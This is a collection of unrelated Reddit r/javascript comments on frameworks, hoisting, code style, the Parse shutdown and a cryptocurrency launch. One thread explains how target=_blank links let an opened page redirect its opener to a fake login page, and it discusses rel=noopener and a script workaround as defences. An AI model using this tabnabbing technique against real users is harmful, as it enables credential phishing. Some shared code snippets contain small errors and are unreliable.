http://docs.meteor.com/#/full/structuringyourapp &gt; ... the names of the files and directories inside your project can affect their load order, where they are loaded, and some other characteristics. Poorly, it would seem. ----- EDIT: Snark aside, most of what I work on involves large teams and 10-100ks of lines of code. I cannot fathom enjoying working in such a non-deterministic environment, as it seems especially prone to varying behavior depending on the operating / file system (i.e. dev on OSX or windows, prod on *nix).
Good work, in closure I see it as 697 bytes minified gzipped, not 1.6KB as you wrote (edit: on github). http://www.closure-compiler.appspot.com
&gt; it’s still only on version 0.14.7 at time of writing and while it is owned by Facebook they are not averse to completely refactoring and changing the way internals work when they feel things could be improved. This isn't really true and it's why React is jumping from 0.14 to 15 instead of 0.15. Facebook has a huge React code base and they would shoot themselves in the foot if they were to make an Angular 2 like rewrite. When React makes breaking changes they release codemods that you can run on your code to automate the upgrade.
Hello, thanks for your input. Would you care to explain further? I'm still learning and I'd appreciate your thoughts on the bracket placement and nested functions. Thank you.
I believe 1.3 will be supporting modules as well as addressing the global namespace issue. Though both are good points to raise.
I mentioned earlier, but they plan to roll out modular support with 1.3. However in it's current state, I agree with you. Large apps can be a challenge.
The purpose is to smooth out parallax images. Strange you guys both have that problem, It goes a little slower than a regular scroll for me, touch pad and mouse.
X-Post referenced from /r/node by /u/victorbjelkholm [Made a tool for making it easier to try out some random nodejs modules](https://www.reddit.com/r/node/comments/4ac1j7/made_a_tool_for_making_it_easier_to_try_out_some/) ***** ^^I ^^am ^^a ^^bot ^^made ^^for ^^your ^^convenience ^^\(Especially ^^for ^^mobile ^^users). ^^P.S. ^^negative ^^comments ^^get ^^deleted. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
idk im not a WinJS guy but are you sure thats how to attach the element? i would do this mySwitch.addEventHandler('change', switchChanged) //or mySwitch.onchange = switchChanged` if its not being called every time either the event handler is probably attached to the `&lt;app&gt;` i would assume it has to be `winui.something(control, event, fn)`, i dont see how it can find the control if not! (unless the control is returned by `fn`) try logging: switchChanged = function(args) { var obj = document.getElementById("mySwitch").winControl; console.log('trigger!', 'element:', obj, 'this:', this) } running this what does it give you every time you click the toggle? (if nothing its attached to wrong control or event. if this or obj is not defined its a code issue for picking the control)
I don't think the coupon worked on your link for Anthony Alicia's udemy course. It's still at $150 for me.
Strange... Try one of the links through this video: https://www.youtube.com/watch?v=kvPNyK_RtyA
http://numberfour.github.io/n4js/faq/comparison-typescript.html
stuff like this: if (something) { /* do something */ }
Hi, I'm the developer of tonal. Be aware it's a work in progress, but lot of modules are stable now. Quick review against Teoria: - tonal scope is much bigger (keys, signatures, chord and scale dictionaries, binary sets, interval density, note ranges...) - tonal is made up of small modules (but Teoria is in the process to be splitted) - tonal has a functional approach vs. a oop approach of teoria - notes and intervals are represented with strings. in tonal: transpose('c2', 'm3') vs Teoria: new Note('C2').transpose(new Interval('m3')) Feedback, issues and pull request are welcomed. EDIT: Almost forgot. The most important difference between Teoria and Tonal is that the first is stable software while Tonal still a work in progress (some stabilized modules, but the rest is alpha software)
Console.table has always worked for me and I use Safari exclusively. Weird
Based on past history, those will likely ship in September or October when Apple ships the next version of OS X and iOS.
Nobody should start learning JS with a framework. Native JS + some utility library like Closure is enough. Learn how to make your own model class, then put React on top of it.
After parse.com - I'm not so sure I want to make my entire DB a SaaS
Just came here hoping someone had said that - I didn't/couldn't read the article because of it.
It's god awful. Honestly. I didn't read the article because of it. I couldn't focus on the text I wanted. Never hijack the scroll. Read it's values and react accordingly. But never hijack it.
What about Basecamp, they are on their 3rd full rewrite with Basecamp 3. As long as you are willing to support the older versions, a rewrite might be a good idea.
Here you go - http://blog.parse.com/announcements/moving-on/
I am in the process of starting a music teaching related application and tonal seems like it's the best thing I could've come across. I have yet to try it out but it looks like it will solve most of the issues I had in mind ... so thanks a lot for this!
My company buy it years ago, but if you can find a free alternative of this I'll be happy to switch.
It's shutting down :( there is a year to migrate: http://blog.parse.com/announcements/moving-on/ 
Very true. For me though those are easier to migrate but your argument stands it could happen with any. I suppose I'm just going to be more wary of using SaaS. I thought parse.com was too big for it to happen to but then this happened.
Why not choose both. Aurelia/Angular for the MC and React for the V?
&gt; I am considering taking a few months off You need to learn JS, no doubt about that, but if you're upfront with your JS skills and desire to learn, let them decide to hire you or not. Better to learn on the job if you can. Don't be embarrassed, every single programmer started out knowing nothing. Just be honest about where you are and keep at it.
I agree and would add that there is something to be said for being embarrassed by where you are and even recognizing that there must be a better way and then going to look for it.
Why not. There aren't that many legacy systems with neos anyway...
Ah, I think I see... it appears the OP for this thread (i.e. restdb) has been linking to other posts like mine, trying to get some visibility for their service.
Correct. To be more precise: you can compare it to using `nodemon` to execute a script with `babel-node` with a good set of plugins already configured (everything, minus the ones your Node version doesn't need). Plus some minor features to make it nicer for trial-and-error experimenting: it clears your display on each save, and it pretty-prints uncaught errors (including a code excerpt to pinpoint the error location). For people who are very comfortable with configuring stuff like babel-node, esbox may feel a bit noobish. But it's good for stuff like demoing a snippet of ES2016 code to a coworker, as you don't need to explain any distracting build system stuff.
Just try to tell me what factor can be causing this. Cause company I'm working in has policy what says that we can't upload code we write anywhere online
http://codepen.io/anon/pen/ZWpwMv
Meteor is not a good place to start. It's a very big and heavy framework that makes a lot of important decisions for you (and many of those choices are very questionable.) Most of all, it's at a high enough level of abstraction, that the skills you'll learn working with meteor will tend not to be very portable outside of Meteor. You have to be careful with software development communities in general, and with javascript in particular to beware of hype. A lot of the bleeding edge frameworks and methodologies are terrible and downright dangerous for beginners. When you are just starting out, you need to begin with simpler, easier and more classical solutions. These are going to be older frameworks, with a lot more books and material written on them and a lot less hype on reddit, blogs, etc. 
They all have same name, same id, but values are different. var processorId = document.getElementById('processor'); if(takenID!= null &amp;&amp; takenID.checked) { does stuff } EDIT: Never had to work with js before, so it's hard to understand some stuff
Seems overly complex, doesn't it?
Is there a reason for using export default React.createClass({}); instead of export default class TodoItem extends React.Component {} ? Great tutorial btw, very similar to [teropa's](http://teropa.info/blog/2015/09/10/full-stack-redux-tutorial.html) as mentioned.
Id is supposed to be unique, document.getElementById will only return the first radio button. You could use document.querySelectorAll("#processor"); to get a NodeList of all the radio buttons then iterate through them, or give them all different ids and then query the different ids manually.
If it's for your own use, that's cool...but that's really uncool that the company relinks to these things on reddit. I'll report it as spam, but you might want to report it too..
https://signalvnoise.com/posts/3856-the-big-rewrite-revisited &gt; Many a rewrite has been started and gone astray for all the wrong reasons. Either it truly was a result of technical bankruptcy, or, perhaps even worse, it was a result of perceived technical bankruptcy by a new team uninterested in learning why things became the way they are. &gt; But there are other types of rewrites. The one most dear to me is the “Don’t Try To Turn A Chair Into A Table” rewrite. It’s the one we committed when we launched the new version of Basecamp a couple of years ago. A full, start-over, everything-is-reimplemented rewrite of Basecamp because we wanted it to do different things. Compare the idea of the above, against: &gt; ... we approached the rewrite of Neos UI with React, Redux, and the rest of **modern and shiny JS stack of 2016**. &gt; ... with time things started to get out of hand, the complexity of it multiplied and development of new interface features started to cost more and more. &gt; ... **we had no interface tests so refactoring it was not easy too**, and the whole thing just **didn’t feel predictable and fun to work with any longer**. 
I made [this](http://i.imgur.com/SmPIfHQ.png): http://ayrtonmassey.com/proj/ It's an app lets you write small programs in ILOC, a language from the book *Engineering a Compiler* by Cooper &amp; Torczon. You can simulate some data-flow analyses on your programs (Reaching Definitions, Variable Liveness, Available Expressions) and see the output step-by-step via a visual graph or a table of results. There's also some mini-tutorials which aim to teach you about data-flow analysis if you've never seen it before. The code behind it is tragic - it's all JQuery and a mish-mash of libraries like dagre/dagre-d3 for the graphs, bootstrap for the UI and PEGjs for the input parsing. It's my final year degree project, so I need to collect data / gather feedback via a survey - it's all optional, you're welcome to just go take a peek and then leave if it's not interesting, but any feedback is welcome - whether it's about the content, UI, UX etc. it's all good!
What this guy said.
prefix your code with debugger; then you can step through and see the order of execution.
There's a reason your thread is down-voted into oblivion - and yes, you definitely need help. You are missing very basic things here, but 'know it all'. Good luck.
ah ok thanks, that makes sense. 
Hi /u/restdb, I know you're looking for every way you can to post about restdb, but please don't submit blogspam.
Thanks, I removed it since it's obviously blogspam.
Thanks a lot for your reply, I could have thought if that, but I didn't. Thank you! Yet, I have trouble with this! This does not work: var nowPlaying = "ADELE" if (nowPlaying ^ ("ADE" || "JUS" || "RIH")){ alert(nowPlaying); } This does work: var nowPlaying = "ADELE" if (nowPlaying.substring(0,3) == ("ADE" || "JUS" || "RIH")){ alert(nowPlaying); } But again, this does not work: var nowPlaying = "JUST" if (nowPlaying.substring(0,3) == ("ADE" || "JUS" || "RIH")){ alert(nowPlaying); } It looks a lot, like it ignores the `||`, what's my problem here? Thank you!
Wait this is also a cryptocurrency? 
You've done what I've been trying to do for a couple of years, and with a much larger scope. I just wanted to make a scale generator, ie, given `('C', '2212221')` produce the major scale. I could never get it to work properly with sharps and flats though.. Yours seems to work excellently, but I find your codebase slightly confusing, I don't understand how you do it! I can't even figure out what file does that, I just find the json lists..
Pas mal ! ;)
Thanks for the article, the library looks pretty clear and straightforward. Will probably find a use case for it :)
Very nice! I swear, I can read an article on the Chrome dev tools every day and still learn about something new.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/lisk] [Let's welcome Javascript Devs](https://np.reddit.com/r/Lisk/comments/4aeaft/lets_welcome_javascript_devs/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
Yes, JavaScript can handle this via what are called 'listeners'. Listeners can be added via native JS (i.e. plain old JavaScript) &amp; can be attached either directly to elements in forms all the way up to the parent document container - example: document.addEventListener('keydown' /* this is the event type, keydown, keyup, etc */, inputDown /* this is the function that is called when this event occurs */, false /* this is a boolean control for how the listener will traverse in the DOM */); See http://www.w3schools.com/jsref/met_document_addeventlistener.asp for more information on listeners. jQuery (an essential library for JavaScript, especially new programmers) also features an easy way to add listeners: https://api.jquery.com/on/ Regarding your specific example, what you would do is create a listener for your element (more than likely a class since you probably will have tons of these fields) that triggers once you are done editing the field. Something like in jQuery $('.myClassExample').on('change', function(){ if ($(this).val().length &gt;= 3) { // here I am using $(this).val() (a jQuery function) to both set the value of the instance of the // 'myClassExample' class and to also split the value and inject the + sign between them at the // 3 place of the string $(this).val( $(this).val().substring(0, 2) + '+' + $(this).val().substring(3, $(this).val().length) ); } }); Also, if you prefer not to add listeners in the JS, you can always write a JS function that is called directly in the element itself; e.g. &lt;input class="myClassExample" type="text" onblur="this.value = myCustomFunction(this.value)" /&gt;
For those wondering, this is basically JavaScript + crypto currency. You are all, no doubt familiar with the former, but perhaps the latter is completely foreign. If you don't know what bitcoin and the subsequent alternative crypto-currency (alt coin) spin offs are, you will have no idea what this is about. Very briefly, bitcoin is revolutionizing the way we think about money; decentralized applications (dApps) are analogous to that movement, but in the generalized digital token space. It's exciting stuff and I'll definitely be looking into this stack because of my interest in blockchain-related currencies and tokens. Looks like some great and visionary work coming from the developers of this project. Parting word of caution (for myself if nobody else): The alt coin space has historically been riddled with scams and 'pump and dump' schemes. I have no idea who the people behind this are, but like all things financial, it's wise to be cautious. Do your research. I will be. 
I wrote a function for you to use in your implementation. function formatNumber(number, sperator) { function insertChar(string, char, index) { return string.slice(0, index) + char + string.slice(index, string.length); } var parsedNumber = parseInt(number); if (parsedNumber != number) { console.error('Not a number.'); return ''; } var stringNumber = parsedNumber.toString(); while (stringNumber.length &lt; 3) { stringNumber = '0'.concat(stringNumber); } stringNumber = insertChar(stringNumber, sperator, stringNumber.length - 2); return stringNumber; } formatNumber(3, '+'); // =&gt; '0+03' formatNumber(300, '+'); // =&gt; '3+00' formatNumber(2000, '+'); // =&gt; '20+00'
To add to this hoisting is treating differently from function declarations and function expressions. Function expressions look like variables ``` var func = function() { console.log('expression') }; ``` Like variables the instantiation of `func` is hoisted but the assignment is not. Whereas in ``` function func() { console.log('expression') } ``` Both the instantiation and declaration are hoisted. So if you changed your first example to b(); console.log(a); var a = 'hello world'; console.log(a); var b = function b() { console.log('called b'); } You'd get undefined undefined 'hello world' Take a look at [this](http://stackoverflow.com/questions/1013385/what-is-the-difference-between-a-function-expression-vs-declaration-in-javascrip) for a better explanation 
My main feedback is to format your code more carefully and to give it a bit more breathing room: function winOrLose() { var foo = rollDice() % 2; ss = (foo == 1) ? "ODD" : "EVEN"; document.getElementById("evenodd").innerHTML = ss; bankroll = 500; if (bankroll &gt; 0) { var theBet = parseInt(document.getElementById("makeBet").value); if (oe == foo){ document.getElementById("msg").innerHTML = "You guessed correctly!" bankroll += theBet * 0.95; } else{ document.getElementById("msg").innerHTML = "Sorry! You lose!" bankroll -= theBet; } document.getElementById("money").innerHTML = bankroll.toFixed(2); } else alert("You are out of money!") } All of this code with no new lines and random spacing makes me think of a long run-on paragraph without any punctuation. Also, please also either never use semicolons or always use them - using both styles is going to annoy both camps of users to no benefit to you. function winOrLose() { var foo = rollDice() % 2; ss = (foo == 1) ? "ODD" : "EVEN"; document.getElementById("evenodd").innerHTML = ss; bankroll = 500; if (bankroll &gt; 0) { var theBet = parseInt(document.getElementById("makeBet").value); if (oe == foo) { document.getElementById("msg").innerHTML = "You guessed correctly!" bankroll += theBet * 0.95; } else { document.getElementById("msg").innerHTML = "Sorry! You lose!"; bankroll -= theBet; } document.getElementById("money").innerHTML = bankroll.toFixed(2); } else { alert("You are out of money!"); } } This to me is now much easier to read. However, there's still a lot of repeated code, and unhelpful variable names. For example, I'd *never* write any code past some kind of example reddit comment with the variable name `foo`. // can also do it for querySelectorAll, just as an example of DRYing up function $(selector) { return document.getElementById(selector); }; function updateWithDiceRoll() { var diceRoll = rollDice(); var isEven = (diceRoll % 2) === 0; // we return early to avoid needless if nesting if (window.bankroll === 0) { alert("You are out of money!"); return; } $("evenodd").innerHTML = isEven ? "Even" : "Odd"; var betAmount = parseInt($("makeBet").value); if (window.isEvenGuess === isEven) { $("msg").innerHTML = "You guessed correctly!" window.bankroll += betAmount * 0.95; } else { $("msg").innerHTML = "Sorry! You lose!"; window.bankroll -= betAmount; } $("money").innerHTML = window.bankroll.toFixed(2); } Even just a little bit of cleanup can go a long way to making your code easier to read to others. White space serves the same purpose in code as it does in prose, giving you meaningful chunks to parse at a time.
Learning an opinionated framework is not Step 1 of learning JavaScript.
Rewrite your blog in a new javascript framework every week.
&gt; Now not only does our validation method create a UUID, it also encrypts the password for us. This is mixing concerns. Why would you let your validation code both generate a UUID and encrypt sensitive data?
It's step 1 to get the things that he need done, quick, and painless. Also he said: &gt;They said I'm free to use any framework so... 
These are great! Thanks for all the help.
Thanks. I'll give that a go now.
Keep interviewing. Make it clear you're not great with JavaScript but you're actively learning and would love the opportunity to learn. Worst case scenario is you don't get those jobs, best case scenario is that you do. In the mean time, study JS. Don't study jQuery, Angular, Backbone, etc until you understand JS. It should take a week, maybe two. Once you understand the basics, then dive into the higher level stuff. A good foundational knowledge of the language will show in pretty much every interview you do, even if they're asking you to do something using a framework. Subjects to study: * What is the prototype chain? How does it work? * How does scope work in JavaScript? * What are the native types in JS? How do they work? * What is variable hoisting? * What is the global scope? What are best practices around that? * What are best practices in general? * What is ES6? What does it add? Where is it available?
You should be extremely grateful that anyone will offer their time to help you with any question without anything for them to gain from it. It's up to you to properly phrase a question before you post it.
Cache those DOM selectors &amp; also it's bad form to create global variables inside of functions. Instead pass in globals as parameters to the function so their scope is set relative to the function's context. Finally you should be using one var declaration per function block. Instead of writing "var a = 0; var b = 1;" you should write "var a=0, b = 1;". You may also want to set a lower cyclomatic complexity on functions breaking more of them up. Some of the best programmers I know make sure their code has a complexity of =&lt; 5.
Thank you for your insights. Very helpful &gt; ...mongo...two way data binding... npm...security...testing...if you tell some guy who currently loves React and Redux because of how testable it is that he should switch to Meteor, abandon is beloved libraries, and forget about testing...he's going to laugh at you. All great points. I'm pretty sure (with v1.3) they are trying to address (or have already addressed) them all, which you have acknowledged, at least partially. &gt; You said you've "done a ton of research", but that sounds a lot like "I've read a lot of blog posts". Yes. But I've done more than that. &gt;you said it was the "clear winner". Clear winner for what? Actually, I said it was the clear winner *for me*. I understand value is subjective. No qualms there. Thanks again.
Hi, open an issue in github and I will be happy to comment and improve the codebase. Glad you like it. 
I'm just formatting the code that the OP had - it would not be possible to remove the global variables without rewriting the entire rest of his example. :) However, I disagree that the ideal code should have one multi var statement. I've always liked the AirBnb style guide, and it's [pretty explicit on multi var statements](https://github.com/airbnb/javascript#variables). I also agree with their style guide in that we don't need to declare all variables at the top of the scope - you should be reasonable about it, and not have them too far away from their use, especially if it results in unnecessary computations.
are you calling it as `removeWeapon(x);` or `return removeWeapon(x);`?
lets walkthrough how the interpreter works: 1 first it reads through the code from top to bottom like a human would. 2 it then moves all variables to the tops of their scope. 3 then it moves all the named functions into memory. 4 then it runs through the code. when applied to the example this looks like this: //step 1: the interpreter reads the code from left to right top to bottom b(); console.log(a); var a = 'hello world'; console.log(a); function b() { console.log('called b'); } //step 2: the interpreter moves all variable declarations to the top of their scope //this means to the top of the file for globals or to the top of the function for local vars. var a = undefined; // this is the top of the scope. //all variables are set to 'undefined' untill they're changed b(); console.log(a); a = 'hello world'; // the variable assingment here will not be hoisted. console.log(a); function b() { console.log('called b'); } //step 3: the interpreter moves the named function declarations to the top of the scope as well. function b() { //this function has been moved to the top of the execution stack console.log('called b'); } var a = undefined; b(); console.log(a); var a = 'hello world'; console.log(a); //step 4: the code is executed from top to bottom excluding callback functions. function b() { console.log('called b'); } // b is declared but not called var a = undefined; //a is declared and set to undefined b(); // "called b" is written to the console console.log(a); // a(undefined) is written to the console var a = 'hello world'; //a is set to "hello world" console.log(a); // a('hello world') is written to the console
While that's fine with ECMA2015 syntax (using let and const) it will leave you open to hoisting and performance bugs using var. After being rewritten by the interpreter multiple var statements will only slow down the performance of code because the var keyword is being run several times instead of just once. The AirBnB style guide you referenced actually supports my point.
I assisted on the design of Obey. We see it more as a model definition library (unbound to a DB, so it can be used across databases) and less as a pure validation-only lib. So it provides a light and straightforward framework for defining the functions you'd be putting in your model layer anyway, but running them automatically and asynchronously as soon as you ingest new data. That way, from your controller (or controller-like construct) what would normally be the same set of function calls to clean and generate your data get abstracted out to just one. Remember that the definition of these things-- ID generation, uniqueness checking, encryption, etc., don't have to be defined within the model itself. That's why obey decouples the creation of these methods from the assignment to your schema :)
res.json(ar) refers to a previously created array that I no longer needed. I should not have included it in my fiddle.
I disagree re: Moustache, in my opinion vanilla Js or jQuery would be better to learn DOM manipulation. This is more likely to be used on the job.
I've used [Joi](https://github.com/hapijs/joi) which is pretty cool; I'll have to look into this as well.
Good job, though a few nit-picks here... function $(selector) { return document.getElementById(selector); }; // &lt;-- semi-colon not required Also, I'd consider it hazardous to use `$` for anything other than jQuery; it's just an accident waiting to happen. Good job on the rest though! 
Re-read the posts between us. You are the only one with something to prove. Find something besides harassing someone who asked for help to make yourself feel better. I'm sure there is a forum just for you somewhere on reddit. Try reddit.com/r/CircleJerk or r/Narcissism. 
And I appreciate that you did. I'm looking forward to the blog post, if that makes it's way into your schedule.
1st example would be quickly caught by any linter. 2nd example while technically correct should probably be avoided due to current browser compatibility restrictions https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Browser_compatibility. 3rd example isn't valid javascript and w. Curly braces without an accompanying keyword denote object literals, which require colon separated key value pairs, keywords like var, new, function can't be used in place of keys and in that style all keys need to have vars assigned to them.
Thanks for your reply. A couple things: * Mongo support will likely be subsumed with them moving towards the [Apollo data stack](https://github.com/apollostack/apollo). * The magic is scary for sure...until you realize none of it is magic, it's just a bunch of JavaScript thoughtfully put together. * Module suppport will be included in v1.3 with ES2015 support. * For me wiring up all the components seemed unnecessarily cumbersome, but yes, if MDG develpment stops there would be pain, forturnately there's 10s of millions of dollars of VC funding that won't want this to happen. * The used to have free hosting, now it's paid, but you can take your app elsewhere. They will have to compete on cost, so I'm guessing I'll be happy giving them my business. Thanks again for your thoughts. Much appreciated. 
Down-voted into oblivion. You are living in your own world.
Says the person who cares more about down-votes/up-votes (clearly) than anything real, like being decent to someone who asked for help (and not even specifically to you, cool guy!). Tell me more about the down-votes! You are def. living in the "real world" . U mad bro?. 
Mad about your down-voted thread :)?
Mad that I don't care about your alleged authority? Don't worry big guy, somebody else might, someday. Thats why you want everyone to know you're a "docMed", right? I'm very impressed :D
use ESlint instead of JSlint 
&gt; a = 'hello world'; // the variable assingment here will not be hoisted. But why? What are the key rules for when hoisting will happen?
Working on my first Vue project and it's an awesome library/framework/whatever. Evan has thought about everything, and the single [file component structure](http://vuejs.org/guide/application.html#Single_File_Components) is glorious for making reusable components and encapsulating CSS + HTML + JS.
Or maybe Meteor. 
Yeah, I remember way back I had to use jQuery with Magento which bundles in Prototype for its own work, and because of that I had to do the noConflict hack. Fun times.
I wasn't aware of the replay feature. That's great.
Would be better if it was implemented in lisp :p
also can't use it with Typescript!
&gt; Because it's distributed with a language runtime which has an LTS SLA. Perhaps the problem extends into distributing a package manager with a language runtime.
hmm. the foo.onclick is chrome syntax (on chrome window.foo will be the button) but its not real-javascript syntax, try using `foo = document.querySelector('#foo')` before `foo.onclick` the onclick stuff https://jsfiddle.net/xofw71eL/ this one is working
you should try reposting this in [r/node](https://www.reddit.com/r/node)
ok thanks I will! Wasn't sure where to post it exactly so I just tried here first.
You want *more* javascript frameworks?
Is it usually this tough for you to follow conversations :(?
At this point I don't think it makes any difference haha :)
As both an avid coder and a huge sports fan I absolutely love reading this kind of thing, and this one would have been really interesting even if it hadn't been NFL related. Great stuff! Thanks for sharing
&gt; the single file component structure is glorious for making reusable components and encapsulating CSS + HTML + JS. React also does the same.
i'm not seeing how this reduces javascript fatigue. quite the opposite, actually
Appreciate the effort. Although this xkcd came to mind :) https://xkcd.com/927/
[Image](http://imgs.xkcd.com/comics/standards.png) [Mobile](https://m.xkcd.com/927/) **Title:** Standards **Title-text:** Fortunately, the charging one has been solved now that we've all standardized on mini\-USB\. Or is it micro\-USB? Shit\. [Comic Explanation](https://www.explainxkcd.com/wiki/index.php/927#Explanation) **Stats:** This comic has been referenced 2639 times, representing 2.5498% of referenced xkcds. --- ^[xkcd.com](https://www.xkcd.com) ^| ^[xkcd sub](https://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](https://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_d10fg9h)
Because some people are locked into environments, where it is (almost) impossible to update the runtime and the package manager relies on this runtime. Node is used in the enterprise, where it's a common problem with rights, updates etc.
I knew react could embed jsx and js in the same page, but how do you embed CSS?
I think this is a pretty cool idea... definitely sounds like something fun to work on.
Very useful. Thank you
indeed react does it too. its one of the core features of react. but in my opinion vue does it better. as html can be written as html/jade. css as less/sass/etc. I am pretty sure that such functionality is not available in jsx. 
how will that look like? I think vue is quite complete as UI. all it needs more is few features and a set of vue components (like vue-strap, but bigger).
'use strict'
Anyone knows what editor/theme is in that picture? Perhaps there's similar theme for Atom? I have big crush on rounded fonts.. 
Thank you! So doing this will result in more code than what I have in my sample, but is it still faster than using document.write()? More importantly I'm interested in knowing if this is the right way to do it?
I'm considering taking some time off to learn JS and then going ahead with interviews. Thank you for that list, I am going to get to it when I start learning.
Hey, CEO of Lisk here. We are launching in the beginning of April. That means nobody could have used it until now. :) 
It's a decentralized platform. In order to prevent spam on a decentralized, blockchain-based platform you need a token with value. This is our "crypto-currency" called LISK.
Lisk basically allows you to setup your own blockchain (decentralized database) and develop a JavaScript application on top of it. This JS app can runn decentralized on multiple nodes, use our own crypto-currency and appears on our App Store. Note: Dapp = Decentralized Application. :)
More code isn't always a bad thing. Ofcourse the right way is purely objective. I'm sure the right way is to install some swanky hipster framework to create an observable variable you can databind to your ul so new categories can be websocketted in...but if you just want it to show a list of categories...this will do it 
wtf So, what do you do about it?
Wow, is this an intentional feature?
This isn't a real problem. The `user-generated content` only has access to the parent's `window` if they're in the same origin. A more complete description would be: &gt; Using "target=_blank" for user-supplied links where you also allow users upload scripts to your website on a different page is a security risk. Allowing users to upload scripts is the real problem.
We actually had quite a long discussion about that design, because the way you suggested is definitely the more natural route. The reason we standardized on named type references was to enable serialization. Because any Obey model can easily be stringified into JSON, that opens the door to a host of other features: self-describing APIs, automatic frontend form generation, easy schema versioning, build time conversions to Flowtype or Typescript definitions, in addition to the ability to store schemas in JSON files or accept new schemas via an API -- a feature wildly useful in the context of defining ETL jobs. With that said, there's an open debate as to whether it would be beneficial to be able to accept a type name _as well as_ a type function in the schema definition, but for 1.0 we decided it would be best to simplify and not have many methods of achieving the same goal.
&gt;The user-generated content only has access to the parent's window if they're in the same origin. Even from other domains the child window can set `window.location` on the parent. That's more than enough for an *"Oh dear your session expired. Please log in again"* attack.
Hi /u/dor_tzur, it looks like you're new to reddit, welcome! Thanks for the submissions, but please make sure you read http://www.reddit.com/rules and our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `thefullstack.xyz`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [thefullstack.xyz](/search?q=%28and+site%3A%27thefullstack.xyz%27+author%3A%27dor_tzur%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;feature=legacy_search)|8|73%
I created https://doclets.io . The Continuous Integration service that turns JSDoc comments into beautiful hosted API pages. Free for open source. Hope you like it!
Shocked!
An even more complete explaination of the problem is that it exists if: - pages are hosted on the same origin - or the parent page uses CORS with "Access-Control-Allow-Origin:*" as is demonstrated in the linked example. Though with the second example, your actions are limited even further (can't manipulate DOM, can change URL)
CSS styles are just key value pairs, so you can create a style dictionary and just reference it in the jsx.
Some cursory testing shows that this also applies to Javascript-based solutions like: $('a.external').click(function() { window.open(this.href); }); Since only `location` is vulnerable, I guess the danger is when you have a web application that can be interacted with by setting `window.location.hash` - eg. a webchat or webmail client. Ideally, of course, that should at most be navigational actions like opening a particular folder or chatroom. (Tried with Gmail, which uses _blank, but it seems to be protected - window.opener is null.)
On Chrome 49.0.2623.87 (64-bit, OSX), the "dangerous" link doesn't do the hack. The page that opens says "The previous tab is safe and intact. window.opener was null; mischief not managed!" and the original page and URL are not changed.
Also keep in mind that some web apps use window.location.hash for internal navigation. You could make someone navigate to a different mail folder, for example. If the app is very stupidly written, you might even trigger some action by going to `#delete?what=all-the-things&amp;confirm=yes` or something. Though at that point, it really goes beyond an obscure vulnerability and into "holy crap that's stupid" territory.
You'll have to use string when passing the arguments and when referencing the object properties. e.g. var object = { property1: 1, property2: 2, property2: 3, method: function(argument1, argument2){ return this[argument1] + this[argument2]; } }; var result = object.method("property1", "property2");
Perfect! Thank you very much.
Speaking of regex in V8, lookbehinds are already in 4.9 behind a flag http://v8project.blogspot.com/2016/02/regexp-lookbehind-assertions.html
Although you're technically right, this isn't actually solved by not using `target=_blank`. If your website support such actions than any page can trigger that by simply loading that URL in an iFrame or redirecting to that url. This is unrelated to `target=_blank`
Now those annoying "You're leaving Facebook, be careful out there!" messages make more sense.
~~But the Acces-Control-Origin header must be placed in the attacker's page for it to work, and welp, the attacker will probably like this.~~ Disregard the above. I suck socks. 
No, the ACAO header must be placed on the victim site. From the example: &gt; https://mathiasbynens.github.io/rel-noopener/ (victim / original site) Access-Control-Allow-Origin:* &gt; https://mathiasbynens.be/demo/opener (attacker / target site) No such header
Oh, right! I just got it now. Thanks.
the fact it's using the fs filesystem and streams is a clear indicator that it's based in node js. So while it's technically not wrong to post it here (many of us use node js) you'll get a better response from the node community.
Read the article? &gt;To prevent pages from abusing window.opener, use rel=noopener. 
Hi /u/ranjithkumar8352, it looks like you're new to reddit, welcome! Thanks for the submissions, but please make sure you read http://www.reddit.com/rules and our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `codingislove.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [codingislove.com](/search?q=%28and+site%3A%27codingislove.com%27+author%3A%27ranjithkumar8352%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;feature=legacy_search)|15|79%
Simple workaround (assuming you have jQuery in place): $(document).on("click", '[target="_blank"]', function (e) { var w = window.open(); e.stopPropagation; e.preventDefault(); w.opener = null; w.location = this.href; } Only downside is it may trigger the window popup blocker.
You can announce it here, just don't spam it (post it many times over a short period of time). You might also try some of the subs listed in our sidebar.
It's okay, I don't expect noobs to understand anything I say.
As long as there are no conflicts with the license of the plugin, its perfectly good practice to use them. Implementing the functionality of a plugin on your own is excellent practice and you learn a lot about the design decisions behind it in the process
Yeah i posted it there. That shows my lack of knowledge on the subject and why I am reaching out for help. Thanks for letting me know that strictly means node js.
That is the most ironic thing I've ever seen.
&gt; The u flag also makes the `.` operator match any Unicode symbol rather than just the characters in the Basic Multilingual Plane (BMP). I'ma let you finish, but having `\w` match alphanumeric characters **outside the Latin alphabet** is the most needed thing for RegExp Unicode support. If JS had actual Unicode support then this: /^\w/u.test('Ænemia') // should return true And what about sorting? ['B', 'Ænemia', 'C'].sort() // it should return ['Ænemia', 'B', 'C'] // instead returns ['B', 'C', 'Ænemia'] &gt; `Object.keys()`, useful for iterating over an object’s enumerable properties **in the same order** returned by `for..in`, is now approximately 2x faster. What order is that? I feel like Google should be explicitly iterating over an object's keys in a random order every time so that junior developers don't expect an object's keys to be in any order. There are ton's of StackOverflow questions asking how to preserve the iteration order of their objects.
Sounds like a winner. Bout to try it. 
okay thanks
